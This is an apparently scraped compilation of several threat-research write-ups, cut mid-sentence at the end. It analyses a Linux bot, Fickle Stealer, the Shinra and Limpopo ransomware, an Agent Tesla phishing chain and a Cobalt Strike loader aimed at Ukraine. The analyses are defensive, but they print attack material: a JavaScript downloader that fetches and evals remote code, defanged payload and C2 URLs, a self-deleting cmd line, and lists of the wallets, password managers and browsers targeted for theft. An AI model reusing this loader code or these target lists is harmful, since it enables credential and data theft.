21: The malware targets Linux architectures The following analysis is based on the malware “skibidi.x86_64.” While executing the malware, it displays the string “youre not skibidi enough.” It then calls the Linux function “ptrace” to handle the process on the victim host. The malware sends signals like a debugger to the sub-program, the malware itself, to fork another process to evade detection. The malware then decodes strings encoded by XOR for the behaviors creating process and popping up execution result string. It calls the system function “prctl,” which manipulates the calling process by naming it with the XOR-encoded strings “-bash” and “x86_64.” Afterward, the malware tries to connect with its C2 server through a socket. Meanwhile, it uses the system call “select” to listen to the events of files the attacker is interested in, such as process events. The malware repeats these steps of listening to events and sends the results back to the server. Cloud services' inherent flexibility and efficiency have unwittingly provided cybercriminals with a new arena for their activities. This shift to cloud-based operations marks a significant evolution in the threat landscape, with malware operators exploiting these platforms' advantages. Organizations must bolster their cloud security defenses as botnets and DDoS tools continue to leverage cloud services. Robust security measures and vigilant monitoring within cloud environments are imperative to combat these sophisticated attacks. Implementing a multi-layered security approach, including regular patching, updates, and network segmentation, is essential to isolate critical assets and mitigate potential breaches.

Rust is a programming language focused on performance and reliability. However, for an attacker, its complicated assembly code is a significant merit. In May 2024, FortiGuard Labs observed a Rust-based stealer. In addition to its intricate code, the stealer is distributed using a variety of strategies and has a flexible way of choosing its target. Because of this ambiguity, we decided to call it Fickle Stealer. This article summarizes the details of this campaign, roughly dividing the attack chain into three stages: Delivery, Preparatory Work, and Packer and Stealer Payload. We are aware of four methods being used to deliver Fickle Stealer: VBA dropper, VBA downloader, link downloader, and executable downloader. For the most part, they download a PowerShell script for preparatory work. The file name is u.ps1 or bypass.ps1—they indicate the same file. In some attack chains, one more file is added between the downloader and u.ps1 The script in the XML file drops Fickle Stealer to the Temp folder and executes it. The second VBA downloader uses forfiles.exe to subvert detections that limit cmd usage. The third downloader uses a trick to indirectly deliver the VBA downloader. In the document, a web browser control that accesses an MSHTML file on the server is embedded in a frame. When the victim enables active content and macro, it reads the MSHTML file and extracts the command from the file. Usually, the WebBrowser.Navigate method is necessary to load a specified URL. However, Word stores the last loaded URL in the document file, and that URL is used if a new one is not provided. In other words, once the URL is loaded, it can be loaded in the next execution even though there is no related macro. Another variant uses this technique to hide the URL (8d3ccfafc39830ee2325170e60a44eca4a24c9c4dd682a84fa60c961a0712316). This section introduces the script files used in this attack. Normal: C:\\Windows \\System32 Fake: C:\\Windows \\System32\\en-US An MSC file, hosted in Microsoft Management Console (MMC), manages the hardware, software, and network components and requires admin rights. Snap-ins provide the interface to the management task and access to the required program and data. The fake WmiMgmt.msc abuses a Shockwave Flash Object from ActiveX control, which opens a web browser by default. The URL for the web browser is set to localhost, and u.ps1 creates HttpListener, which shows a web page when WmiMgmt.msc is executed. The web page contains a script that configures exclusions for Fickle Stealer and then downloads it to be executed. The file path uses a technique called the Mock Trusted Directories Method. When converting a string during an evaluation request process, the trailing space after “Windows” is removed. As a result, the WmiMgmt.msc will be treated as executed from a trusted path. Furthermore, MMC searches the MSC file for local languages. If not found, it tries to find one for en-US, so when Fickle Stealer executes WmiMgmt.msc’s copy, the fake WmiMgmt.msc is executed instead, with elevated authentication and no UAC prompt pops up. Besides the message, tgmes.ps1 sends victim information, including country, city, IP address, OS version, computer name, and user name to the Telegram bot. Fickle Stealer is protected by a packer disguised as a legal executable. It seems that the attacker made the packer by replacing some code of a legal executable with the packer’s code and changing a function called in the initialize routine into the packer’s function. This can frustrate the static analysis. Mimicking various applications makes it difficult to detect the malware using certain detection rules. For example, there is a variant (a641d10798be5224c8c32dfaab0dd353cd7bb06a2d57d9630e13fb1975d03a53) whose__cinitfunction in the initialize routine is modified into the packer’s function. In this case, the malicious code is executed before the WinMain function, which is usually the user-provided entry point for a C/C++ GUI application. As a result, people following typical analysis rules may overlook the malicious code. The packer only allocates memory to write the decrypted payload data and then executes it in memory. Initially, Fickle Stealer creates a mutex to prevent a race condition. It then performs a series of anti-analysis checks and exits the process while it is being analyzed. Generally, it shows a fake error message before terminating the process.

Next, it creates a new folder in the Temp folder with a random name, drops its copy to the new folder, and executes the copy. The currently running stealer will be terminated, and the copy will finish the remaining work to communicate with the server and send stolen data to the server. If the environment check is passed, Fickle Stealer sends victim information to the server. The server sends a list of target applications and keywords as a response. Fickle Stealer sends all files in folders according to the list. The stolen data is stored in a specific JSON format that has three key-value pairs: { \"name\": \"RB_{Computer name}\",\"title\": {File name},\"body\": {File content} } In this sample, its name contains a string RB and the name of the victim’s computer. In version 1.5.7 (a641d10798be5224c8c32dfaab0dd353cd7bb06a2d57d9630e13fb1975d03a53), the string “RB” is changed to “Hold.” The title indicates the data it grabs. It usually contains a tag followed by a file path. The body is base64-encoded file content. After being compressed with the Deflate algorithm, the JSON-formatted data is sent to the server. There are some exceptions. For example, the first packet sent to the server contains the following items, and the title is System.txt. user name, user domain, DNS host name, NetBIOS name, screen resolution, OS version, language, host name, ip address and hardware information: CPU, GPU, Antivirus software, installed application and currently running process The server's response is also in JSON format and has three key-value pairs: status, k, and c. The target list, encrypted using an RC4 algorithm and then base64 encoded, is stored in c. The decryption key for RC4 is stored in k, as the following image shows. There are four kinds of targets: crypto wallets, plugins, file extensions, and partial paths. Below are the targets specified by the server and the way the data is processed: Wallet Sends files in specified folders. The title of data to send has a “wallet::” tag. AtomicWallet, Exodus, JaxxWallet, Electrum, ByteCoin, Ethereum, Guarda, Coinomi, Armory, ZCash Plugin Sends files in specified folders. The title of data to send has a “plugin___” tag. Authenticator, EOSAuthenticator, Bitwarden, KeePassXC, Dashlane, 1Password, NordPass, Keeper, RoboForm, LastPass, BrowserPass, MYKI, Splikity, CommonKey, ZohoVault, NortonPasswordManager, AviraPasswordManager, TrezorPasswordManager, MetaMask, TronLink, BinanceChain, Coin98, iWallet, Wombat, MEWCX, NeoLine, TerraStation, Keplr, Sollet, ICONex, KHC, TezBox, Byone, OneKey, DAppPlay, BitClip, SteemKeychain, NashExtension, HyconLiteClient, ZilPay, LeafWallet, CyanoWallet, CyanoWalletPro, NaboxWallet, PolymeshWallet, NiftyWallet, LiqualityWallet, MathWallet, CoinbaseWallet, CloverWallet, Yoroi, Guarda, EQUALWallet, BitAppWallet, AuroWallet, SaturnWallet, RoninWallet, Exodus, MaiarDeFiWallet, Nami, Eternl, UniSatWallet File extension Searches files with the following extensions in %USERPROFILE% and the sub-folder. The title of data to send has a “grabg::” tag. .txt, .kdbx, .pdf, .doc, .docx, .xls, .xlsx, .ppt, .pptx, .odt, .odp, wallet.dat Partial path Concatenates %APPDATA% and the following strings and searches log files and ldb files in the Local Storage/leveldb subfolder.

Below are those targets and the way data is processed: Applications Sends files in specified folder to the server. Most often, the tag is the application name in lower case appended by two colons: Anydesk, Ubisoft (tag:uplay::), Steam, Skype, Signal, ICQ, Filezilla, Telegram, Tox, Pidgin, Element Gecko engine browser Searches %APPDATA%, %LOCALAPPDATA% or %USERPROFILE% for these files: logins.json key4.db, keydb (tag: geckologins::) and  cookies.sqlite (tag: geckocookies::) If found, it copies the file to the Temp folder, sends a copy to the server, and deletes the copy. Chromium based browser Searches “os_crypt\" and \"encrypted_key” in the Local state file to get a decryption key. It parses data in Cookies, History, WebData, and Login Data files to obtain sensitive data and sends a summarized result to the server. These files are also copied to the Temp folder before Fickle Stealer reads them. They are later deleted. The title is browser and the data is stored in JSON format. Finally, it sends a screenshot to the server and deletes itself by executing the following command: cmd.exe /c timeout /t 5 & del /f /q {stealer} && exit In addition to some popular applications, this stealer searches sensitive files in parent directories of common installation directories to ensure comprehensive data gathering. It also receives a target list from the server, which makes Fickle Stealer more flexible. Variants receiving an updated list are observed. The frequently updated attack chain also shows that it’s still in development. FortiGuard will continue monitoring malware variants and provide appropriate protections as needed.

    "content": "FortiGuard Labs Threat Research FortiGuard Labs gathers data on ransomware variants of interest that have been gaining traction within our datasets and the OSINT community. The Ransomware Roundup report aims to provide readers with brief insights into the evolving ransomware landscape and the Fortinet solutions that protect against those variants. This edition of the Ransomware Roundup covers the Shinra and Limpopo ransomware. Affected platforms:Microsoft Windows, VMWare ESXiImpacted parties:Microsoft Windows and VMWare ESXi UsersImpact:Encrypts victims' files and demands ransom for file decryptionSeverity level:High The Shinra ransomware was first submitted to a publicly available file-scanning service in April 2024. The threat actor steals victims' data before deploying and running its ransomware malware to encrypt files. The ransomware is also designed to delete Volume Shadow Copies to inhibit system recovery. Since threat actors sometimes use the names of subcultural characters and organizations, we wondered if Shinra was borrowed from the criminal corporation in the Final Fantasy 7 game, but unfortunately, we found no such evidence. Information on the infection vector used by the Shinra ransomware threat actor is unavailable. However, it is not likely to differ significantly from other ransomware groups. The Shinra ransomware samples were submitted to a publicly available file scanning service from Israel, Poland, Russia, the United Kingdom, and the United States. One of the Shinra ransomware samples (SHA2: 31eec61ed6866e0b4b3d6b26a3a7d65fed040df61062dd468a1f5be8cc709de7) performs the following actions: The Shinra ransomware sample copies itself to the current user's startup folder in the start menu as <ID>.exe, where <ID> is 32 hex characters. It then terminates processes whose names contain any of the following strings: wxServer wxServerView Sqlmangr RAgui supervise Culture Defwatch winword QBW32 QBDBMgr qbupdate axlbridge httpd fdlauncher MsDtSrvr java 360se 360doctor wdswfsafe fdhost GDscan ZhuDongFangYu QBDBMgrN mysqld AutodeskDesktopApp acwebbrowser Creative Cloud Adobe Desktop Service CoreSync Adobe CEF Helper node AdobeIPCBroker sync-taskbar sync-worker InputPersonalization AdobeCollabSync BrCtrlCntr BrCcUxSys SimplyConnectionManager Simply.SystemTrayIcon fbguard fbserver ONENOTEM wsa_service koaly-exp-engine-se It also terminates services whose names contain any of the following strings: wrapper DefWatch ccEvtMgr ccSetMgr SavRoam Sqlservr sqlagent sqladhlp Culserver RTVscan sqlbrowser SQLADHLP QBIDPService Intuit.QuickBooks.FCS QBCFMonitorService msmdsrv tomcat6 zhudongfangyu vmware-usbarbitator64 vmware-converter dbsrv12 dbeng8 MSSQL$MICROSOFT##WID MSSQL$VEEAMSQL2012 SQLAgent$VEEAMSQL2012 SQLBrowser SQLWriter FishbowlMySQL MSSQL$MICROSOFT##WID MySQL57 MSSQL$KAV_CS_ADMIN_KIT MSSQLServerADHelper100 SQLAgent$KAV_CS_ADMIN_KIT msftesql-Exchange MSSQL$MICROSOFT##SSEE MSSQL$SBSMONITORING MS The Shinra ransomware replaces the desktop wallpaper by changing the following registry setting: The ransomware sets the following registry keys: It also uses wevtutil.exe to enumerate and clear Windows logs. The ransomware does not encrypt files with the following extensions: .exe .dll .msi .bmp .iso .shinra2 The ransomware does not encrypt files in directories containing the following strings: $Windows.~bt intel msocache $recycle.bin Windows photo viewer Windows nt msbuild internet explorer System volume information Windows.old google application data Windows defender Windows perflog Windows security Windowspowershell microsoft boot Windows journal microsoft shared common files appdata usoshared $Windows.~ws all users Windowsapp microsoft.net It avoids encrypting the following files: ntldr ntuser.dat bootsect.bak autorun.inf thumbs.db iconcache.db Oddly enough, the Shinra ransomware also includes a different list of file extensions, but we could not find any code using this list. It’s possible that the list is for future development or leftover code that wasn’t removed. The list contains the following extensions: .rar .zip .ckp .db3 .dbf .dbc .dbs .dbt .dbv .frm .mdf .mrg .mwb .myd .ndf .qry .sdb .sdf .sql .tmd .wdb .bz2 .tgz .lzo .db .7z .sqlite .accdb sqlite3 .sqlitedb .db-wal .db-shm .dacpac .1c .1cd .vmdk .vmem .iso .tar .fdb .csv .mdb .sl2 .mpd .rsd .tdb .tib The Shinra ransomware uses COM to run the following commands to delete shadow copies, making file recovery difficult: It then appends “.[ethan@[removed].info].SHINRA2” to the infected files. Other Shinra ransomware variants add different file extensions, such as \".SHINRA3,\" \".SHINRA7,\" and \".SHINRA9\" instead of \".SHINRA2.\" Also, some of the samples change the file icon of the encrypted files, as seen in this screenshot: The ransomware executes the following command to change the \"boot status policy\" settings so that Windows starts normally regardless of any boot errors: It also executes the following command, which disables the recovery and repair functions of Windows: The ransomware then restarts itself using \"runas admin\" to ensure that it is running with administrator privileges. The malware also checks to make sure it’s running inside a targeted operating system by: The ransomware silently empties the Recycle Bin without user confirmation, progress bar, or sound. Finally, it drops a ransom note, which demands victims to contact the attacker via email: In March of this year, FortiGuard Labs received an inquiry from an Asian law enforcement agency about ransomware named “Socotra” due to its impact in that region. While no sample of the Socorta ransomware has surfaced to date, we were able to trace it back to another ransomware, Limpopo, which was submitted to a publicly available file scanning service in February 2024 that targets ESXi environments. Information on the infection vector used by the Limpopo ransomware threat actor is unavailable. Given thatBushidoToken's tweetreported that this malware is affecting Latin America and Thailand, in addition to the previous inquiry about Socorta ransomware from Asia, it is not hard to imagine that they are spreading the ransomware widely in some way, such as through Trojanized software or by exploiting vulnerabilities. Based on the locations from which ransom notes likely used by the Limpopo ransomware family were submitted to the publicly available scanning service, the countries of Chile, Guatemala, Honduras, India, Italy, Mexico, Peru, Spain, Thailand, the United States, and Vietnam were potentially affected. The Limpopo ransomware is not complex. Once executed, the Limpopo ransomware encrypts files with the following extensions: .log .vmdk .vmsd .vmem .vswp .vmx2 .vmxf .vmss .vmtx .vmtm .nvram .vsb .vbm .vlb .vrb .hlog .rar .vsm .vsm .vbk .zip .iso .tgz .bco .dump .gzip .bck .bkp .tmp .vmx .ova .ovf .tar .vmd .vmsn Once files have been encrypted, a “.LIMPOPO” extension is added to the filename. Files with this extension are skipped and effectively whitelisted. It then drops the following ransom note: Hi. We have your data. If you don't cooperate it will be made public. Go to hxxps://getsession[.]org/ Downloadinstall then add [removed] mention this code LIMPOPO in your messageget in touch with us No other samples of the Limpopo ransomware were found, but we found similar ransom notes that may have been used by ransomware variants. For example, the Socorta ransomware, a potential Limpopo variant, drops the following ransom note: Go to hxxps://getsession[.]org/ Downloadinstall then add [Removed] to your contacts and send a message with this codename -- SOCOTRA Although no actual malware samples are available, other possible Limpopo ransomware variants include Akgum, Aktakyr, Bulanyk, Formosa, Hatartam, Monjukly, Sakgar, Sazanda, and Windows ransomware. While unverified, thetweetbelow claims that the Socotra ransomware exploits CVE-2024-22252 and CVE-2024-22253 (CVE-20204-22252 and CVE-20204-22253 may be a typo) that affect VMware ESXi, Workstation, and Fusion, which were patched in March 2024. English translation: In the case of cve 20204-22252, cve-20204-22253, be sure to patch it because it will destroy your Eid holiday. The Shinra and Limpopo ransomware described in this report are detected and blocked by FortiGuard Antivirus as: FortiGate, FortiMail, FortiClient, and FortiEDR support theFortiGuard AntiVirus service. The FortiGuard AntiVirus engine is part of each of those solutions. As a result, customers with up-to-date versions of these products installed are protected.

Since the majority of ransomware is delivered via phishing, organizations should consider leveraging Fortinet solutions designed to train users to understand and detect phishing threats: TheFortiPhish Phishing Simulation Serviceuses real-world simulations to help organizations test user awareness and vigilance to phishing threats and to train and reinforce proper practices when users encounter targeted phishing attacks. Our FREEFortinet Certified Fundamentals (FCF)in Cybersecurity training. The training is designed to help end users learn about today's threat landscape and will introduce basic cybersecurity concepts and technology. Organizations will need to make foundational changes to the frequency, location, and security of their data backups to effectively deal with the evolving and rapidly expanding risk of ransomware. When coupled with digital supply chain compromise and a workforce telecommuting into the network, there is a real risk that attacks can come from anywhere. Cloud-based security solutions, such asSASE, to protect off-network devices; advanced endpoint security, such asEDR(endpoint detection and response) solutions that can disrupt malware mid-attack; andZero Trust Accessand network segmentation strategies that restrict access to applications and resources based on policy and context, should all be investigated to minimize risk and to reduce the impact of a successful ransomware attack. As part of the industry's leading fully integratedSecurity Fabric, delivering native synergy and automation across your security ecosystem, Fortinet also provides an extensive portfolio of technology and human-based as-a-service offerings. These services are powered by our global FortiGuard team of seasoned cybersecurity experts. FortiReconis a SaaS-based Digital Risk Prevention Service backed by cybersecurity experts that provides unrivaled threat intelligence on the latest threat actor activity across the dark web, providing a rich understanding of threat actors’ motivations and TTPs. The service can detect evidence of attacks in progress allowing customers to rapidly respond to and shut down active threats. Organizations such as CISA, NCSC, theFBI, and HHS caution ransomware victims against paying a ransom partly because the payment does not guarantee that files will be recovered. According to aUS Department of Treasury's Office of Foreign Assets Control (OFAC) advisory, ransom payments may also embolden adversaries to target additional organizations, encourage other criminal actors to distribute ransomware, and/or fund illicit activities that could potentially be illegal. For organizations and individuals affected by ransomware, the FBI has a Ransomware Complaintpagewhere victims can submit samples of ransomware activity via their Internet Crimes Complaint Center (IC3).

    "title": "New Agent Tesla Campaign Targeting Spanish-Speaking People",
    "link": "https://www.fortinet.com/blog/threat-research/new-agent-tesla-campaign-targeting-spanish-speaking-people",
    "content": "FortiGuard Labs Threat Research Affected Platforms:Microsoft WindowsImpacted Users:Windows UsersImpact:Collects sensitive information from a victim’s computerSeverity Level:Critical A new phishing campaign was recently captured by our FortiGuard Labs that spreads a new Agent Tesla variant targeting Spanish-speaking people. Security researchers have detected Agent Tesla campaigns from time to time for years. Agent Tesla is a well-known .Net-based Remote Access Trojan (RAT) designed to stealthily infiltrate victim’s computers and steal their sensitive information, such as their computer’s hardware information, login user information, keystrokes, email contacts, web browser cookies files, system clipboard data, screenshots, and basic information like login user name, computer name, OS information, CPU and RAM information, as well as saved credentials in widely installed software. In-depth research on this campaign shows that it also leverages multiple techniques to deliver the Agent Tesla core module, such as using known MS Office vulnerabilities, JavaScript code, PowerShell code, fileless modules, and more, to protect itself from being analyzed by security researchers. In this analysis, I will elaborate on how the campaign works to load Agent Tesla onto a victim’s computer, how it starts, what sensitive data it is able to collect, and the way it sends stolen data to the attacker. As you can see from the above screenshot, the phishing email was written in Spanish. The message translated into English reads as: Good day Attached is proof of payment made to your account according to your client's instructions. The phishing email looks like a standard SWIFT transfer notification from a large financial institution with a disguised Excel attachment (transferencia_swift_87647574684.xla) to the victim, as shown in Figure 1. As you may have noticed, the FortiClient service marked the phishing email with “[virus detected]” to warn the user about the attached Excel document. The Excel document is in OLE format with crafted embedded data that exploits theCVE-2017-0199vulnerability. It contains an embedded OLE hyperlink, which is opened automatically once the Excel document is started by the victim. The provided hyperlink in the document is “hxxp[:]//ilang[.]in/QqBbmc”, as shown in Figure 2. Once the victim opens the Excel file, it automatically downloads an RTF document, which the Word program then calls to open. Figure 3 shows the traffic and how the URL downloads the RTF document. CVE-2017-11882is an RCE (Remote Code Execution) vulnerability in Microsoft Office’s Equation Editor component (EQNED32.EXE). It can be exploited by Excel, Word, PowerPoint, and RTF documents as long as they contain crafted equation data in an OLE object. Successfully exploiting this vulnerability allows an attacker to execute arbitrary code on a victim's computer. This buffer overflow vulnerability overrides a return address in the stack of EQNED32.EXE. It can then hijack the process to jump to and execute the malicious code copied in the stack. Figure 4 shows the crafted equation data extracted from the downloaded RTF document. The data marked in red is a constant address of EQNED32.EXE that will override a return address in the stack when a buffer overflow occurs. Once the shellcode is executed, it downloads a JavaScript code from a website and executes it on the victim’s computer. In Figure 5, the shellcode was about to call an API, URLDownloadToFileW(), to download the JavaScript file from “hxxp[:]//equalizerrr[.]duckdns.org/eveningdatingforeveryone.js” to the local file “C:\\Users\\Bobs\\AppData\\Roaming\\morningdatingroses.js.” It then calls the API ShellExecuteW() to execute the JavaScript file (the Windows program WScript.exe is called to execute the JS file). Finally, it exits the process by calling the API ExitProcess(). Below is a code snippet of the JavaScript file. It is very clear that it continues to download another file from “hxxps[:]//paste[.]ee/d/yWWXG.” This JavaScript file is executed after calling the eval() function. morningdatingroses.js: var paparicos = new ActiveXObject(\"MSXML2.XMLHTTP\");var alijar = \"GXWWy/d/ee.etsap//:sptth\".split(\"\").reverse().join(\"\");paparicos.open(\"GET\", alijar, false);paparicos.send(); var vomitar = \"\";if (paparicos.status === 200) {vomitar= paparicos.responseText;} function estarostia(piguancha) {eval(piguancha);} estarostia(vomitar); When opening the URL in a web browser, it looks like normal JavaScript code, but it contains a piece of malicious code with base64-encoded PowerShell code. This code will be decoded and combined with other code (shown below) and executed inside a “powershell.exe” process, as you can see in Figure 6. The PowerShell code’s purpose includes: Please refer to Figure 7 for more information about the PowerShell code. The loader-module is a kind of fileless module that is never saved in the local folder. This makes it difficult for a researcher to notice the file unless performing a step-by-step, in-depth analysis. The first argument to the method VAI() is a reversed URL to the Agent Tesla core module, which is “hxxp[:]//equalizerrr[.]duckdns[.]org/droidbase64controlfire.txt.” The second argument is a switch. If it’s “1,” it will establish persistence on the victim’s computer by adding itself to the auto-run group in the system’s registry. In this case, it’s \"desativado,” so it won’t establish. The penultimate argument is a process name, which for this variant is “AddInProcess32.” The loader-module running in a PowerShell process downloads a file from the URL passed by the first argument and keeps it in the memory. This is the Agent Tesla core module, as shown in Figure 8. Afterward, it initiates the 'AddInProcess32' process in a suspended state by calling the API CreateProcessA() with the creation flags of 0x80000004 (CREATE_SUSPENDED). Next, the loader-module performs process hollowing on the process that it copies the Agent Tesla executable into and executes it within the “AddInProcess32.exe” process. To do this, it calls APIs, such as GetThreadContext(), VirtualAllocEx(), WriteProcessMemory(), SetThreadContext(), and ResumeThread(). Figure 9 shows the process tree outlining the complete picture, starting from the Excel document and ending with Agent Tesla running inside “AddInProcess32.exe.” This variant of Agent Tesla is a 32-bit .Net framework program is being obfuscated as a fileless module. Figure 10 shows a debugger that breaks Agent Tesla at the EntryPoint method, where the namespaces, classes, methods, and code flow are all obfuscated. A special method aims to detect whether it is running in an analysis environment. It performs the following detections: Once any of the above detections’ results are ‘true,’ it exits the process. In this section, I will review Agent Tesla’s features, such as how this variant collects credentials and email contacts from the victim’s device, the software from which it collects the data, and the basic information of the victim’s device. It steals saved credentials from some web browsers, classified as Chromium-based and Mozilla-based, because they use the same folder structure and files to save the credentials. It reads saved credentials from “Login Data” files under their browsers’ profile folder for Chromium-based browsers. Figure 11 shows that it had just obtained some “Opera Browser” (Chromium-based browser) credentials from its profile files “{browser’s profile path}\\Default\\Login Data” and “{browser’s profile path}\\Login Data.” Figure 12 shows it has just obtained credentials from a Firefox browser’s profile. This variant will steal credentials from the following web browser list. Chromium-based Web Browsers \"Orbitum,\" \"Elements Browser,\" \"Cool Novo,\" \"Sputnik,\" \"360 Browser,\" \"Uran,\" \"Iridium Browser,\" \"Liebao Browser,\" \"Vivaldi,\" \"Chromium,\" \"Sleipnir 6,\" \"Coowon,\" \"Coccoc,\" \"Amigo,\" \"Chedot,\" \"Epic Privacy,\" \"CentBrowser,\" \"Edge Chromium,\" \"Chrome,\" \"Citrio,\" \"Opera Browser,\" \"QIP Surf,\" \"Brave,\" \"Kometa,\" \"Comodo Dragon,\" \"7Star,\" \"Torch Browser,\" \"Yandex Browser.\" Mozilla-based Web Browsers \"Firefox, \"CyberFox, \"WaterFox, \"K-Meleon, \"Postbox, \"Thunderbird browser, \"IceCat, \"Flock, \"IceDragon, \"BlackHawk, \"PaleMoon,\" and \"SeaMonkey.” Other than the above web browsers, Agent Tesla continues to look for more saved credentials from a wide range of software, which I have categorized below. Other Web Browsers: \"Falkon Browser,\" \"Flock Browser,\" \"IE/Edge,\" \"QQ Browser,\" \"Safari for Windows,\" and \"UC Browser.” Email clients: \"Outlook, \"Opera Mail, \"PocoMail, \"The Bat!\", \"Becky!\", \"ClawsMail, \"FoxMail, \"IncrediMail, \"eM Client, \"Mailbird, \"Eudora,\" and \"Windows Mail App.\" FTP clients: \"CoreFTP,\" \"Flash FXP,\" \"FTPGetter,\" \"FTP Navigator,\"  \"FileZilla,\" \"SmartFTP,\" \"FtpCommander,\" \"WinSCP,\" and \"WS_FTP.\" VPN clients: \"NordVPN,\" \"TightVNC,\" \"RealVNC,\" \"UltraVNC,\" \"OpenVPN,\" and \"Private Internet Access.\" IM client: \"Discord,\" \"Pidgin,\" \"Trillian,\" \"Psi/Psi+,\" and \"Paltalk.\" Others: \"MysqlWorkbench,\" \"DynDns,\" \"Microsoft Credentials,\" \"Internet Downloader Manager,\" and \"JDownloader.” Agent Tesla can also collect the victim’s email contacts if they use Thunderbird as their email client. Inside global-messages-db.sqlite, under the Thunderbird profile folder, there is a file named global-messages-db.sqlite. It is an SQLite database that stores an index of all messages, including attachments, BCC and CC emails, folder names, and more. Agent Tesla extracts all contacts (email addresses) from such files. Based on my analysis, this variant disabled some features (some switch variables are set to “false” by default.), such as the keylogger, the screen logger, the system clipboard logger, and cookies. Refer to Figure 14 for details. Agent Tesla also collects information about the victim’s computer, such as the system date and time, login user name, computer name, public IP address, OS full name, CPU information, and RAM capacity. In the past, we captured many Agent Tesla variants that used HTTP POST and SMTP to submit their stolen data to their C2 server. This variant uses a new way to submit the data it collects from the victim’s device over the FTP protocol. The FTP server address and its credentials are plaintext strings held in some global variables. Figure 15 is a screenshot of Agent Tesla about to submit s credentials stolen from my test machine using the FTP method “STOR.” The format of the file name on the FTP is in “PW_{User name-Computer name_System Data&Time}.html”; the content is the stolen data in HTML format. The collected email contacts are in a txt file named “Contacts_Thunderbird.txt_{User name-Computer name_System Data&Time}.txt”. One example on my test machine is “Contacts_Thunderbird.txt_Bobs-BOBS-PC_2024_05_17_17_34_21.txt”. The txt file contains all the email addresses collected from Thunderbird. In this analysis, I went through the entire process of the Agent Tesla campaign targeting Spanish-speaking people. The flowchart in Figure 16 outlines this complex malicious campaign, detailing the process from the phishing email to the stolen information being submitted to an FTP server. We also examined how it uses multiple techniques to escape researcher analysis, such as exploiting two Microsoft vulnerabilities carried by Excel, RTF documents, executing JavaScript and PowerShell scripts, and encoding most downloaded files in base64. Next, we looked at how the fileless loader-module is called to download the Agent Tesla executable and run it in a process-hollowed AddInProcess.exe process. I then elaborated on how Agent Tesla detects whether it’s running in an analysis environment, like sandboxes, virtual machines, etc., or where there is AV software running, like Avast, Comodo, etc. We then looked at the functions this variant can perform on the victim’s device. It collects saved credentials from over 80 popular software applications and victim email contacts from Thunderbird profile files. Finally, you learned how this Agent Tesla variant submits the sensitive data it has harvested from the victim’s device to an FTP server using the “STOR” method. Fortinet customers are already protected from this campaign with FortiGuard’s AntiSPAM, Web Filtering, and AntiVirus services as follows: The downloading URLs are rated as “Malicious Websites” by the FortiGuard Web Filtering service. FortiMail recognizes the phishing email as “virus detected.” In addition, real-time anti-phishing provided by FortiSandbox embedded in Fortinet’s FortiMail, web filtering, and antivirus solutions provides advanced protection against both known and unknown phishing attempts. FortiGuard Antivirus service detects the attached Excel document, the downloaded RTF document, and the Agent Tesla executable file with the following AV signatures.

    "content": "FortiGuard Labs Threat Research Affected Platforms:Microsoft WindowsImpacted Users:Microsoft WindowsImpact:Compromised machines are under the control of the threat actorSeverity Level:High FortiGuard Labs has recently identified a sophisticated cyberattack involving an Excel file embedded with a VBA macro designed to deploy a DLL file. The attacker uses a multi-stage malware strategy to deliver the notorious \"Cobalt Strike\" payload and establish communication with a command and control (C2) server. This attack employs various evasion techniques to ensure successful payload delivery.Over the past few years, Ukraine has been a significant target due to its geopolitical situation. The history of these attacks reveals a pattern of increasing complexity and frequency, particularly during periods of geopolitical tension. For instance, in 2022,FortiGuard Labsreported a campaign using a malicious Excel document themed around the Ukrainian military to deliver a multi-stage Cobalt Strike loader. In 2023,Ukraine’s Computer Emergency Response Team (CERT-UA)disclosed that UAC-0057 was involved in an attack using a malicious XLS file containing a macro and a lure image to deploy PicassoLoader and Cobalt Strike Beacon on compromised systems. In this article, we will explore the technical details of this latest multi-stage attack. The malicious Excel document contains elements in Ukrainian designed to lure the user into enabling its macros. Once the VBA macro is enabled, the document switches to sheets related to the calculation of the “amount of budget funds allocated to military units” (translated from “обсягу бюджетних коштів, що спрямовуються до військових частин”). The primary function of the VBA macro is to deploy a DLL downloader, which is encoded in HEX. Additionally, most of the strings in the VBA code are HEX-encoded to evade basic string detection mechanisms. After dropping the DLL file “Ac83faafb23919Ae9.DLl” into “%APPDATA%\\VIBErpc\\bIn\\biN,” the macro creates a shortcut named “ACtIVePRObE” in “%APPDATA%\\Microsoft.” It then uses the “Shell” command to execute “RunDLL32.EXE shell32.dll,ShellExec_RunDLL '%APPDATA%\\Microsoft\\ACtIVePRObE.lnk', 0.” This LNK file is designed to calls regsvr32 to execute the DLL file “Ac83faafb23919Ae9.DLl.” The downloader “Ac83faafb23919Ae9.DLl.” is obfuscated with ConfuserEx. First, it examines process names for specific strings: “processhacker,” “avastui,” “aswtoolssvc,” “wsc_proxy,” “procexp,” “overseer,” and “avastsvc.” If it detects a matching process associated with an analysis tool or antivirus software, it terminates the program. Once passing the process checking, it constructs a web request to get the next stage payload from the URL “hxxps://goudieelectric[.]shop/cms/svg/6364.2809640e[.]chunk.svg.” It can only download the required file if the device is located in Ukraine. It then extracts the base64 encoded data in the section that starts with “href=” and XOR it with the hard-coded array. It then generates a random file name and saves the decoded data to the TEMP folder. It then executes the decoded file using “rundll32.exe,” followed by a sleep command to wait for the execution to finish. Once completed, it deletes the decoded file to remove any traces. The decoded data is also a .NET DLL file tasked with decrypting the file for the next stage and establishing persistence. Next, it checks if the targeted file exists. If not, it creates the file “C:\\ProgramData\\Windows\\Containers\\BaseImages\\9cb03978-56d9-4f38-8f05-d1fdf135f0ab\\Files\\Windows\\System32\\ResetEngine.dll.” It then uses the hard-coded key to decrypt the data using an RC4 algorithm and writes the data to the newly created file. It then adds the registry value “C:\\Windows\\System32\\regsvr32.exe /s C:\\ProgramData\\Windows\\Containers\\BaseImages\\9cb03978-56d9-4f38-8f05-d1fdf135f0ab\\Files\\Windows\\System32\\ResetEngine.dll” into “SOFTWARE\\Microsoft\\Widows\\CurrentVersion\\Run” for persistence and uses InvokeMethod with “Create” to execute the command in the registry. The file “ResetEngine.dll” serves as the core component for decrypting and injecting the final payload. It uses “NtDelayExecution” to evade the detection of malicious activities within sandboxes. It then iterates to inspect processes and attempts to terminate the parent process, if any, in order to implement its anti-debugging measures. After the evade detection process is complete, it decrypts the final payload with an AES algorithm. After decryption, it injects the decrypted data into itself and employs various APIs, including “GetCurrentProcessId,” “OpenProcess,” “VirtualAllocEx,” “WriteProcessMemory,” “CreateRemoteThread,” and “WaitForSingleObject” to execute the final Cobalt Strike. The configuration extraction process involves XOR-ing with 0x2E, allowing us to decipher the information hidden within. By extracting and parsing the configuration, we unveiled the Beacon’s Cobalt Strike Team 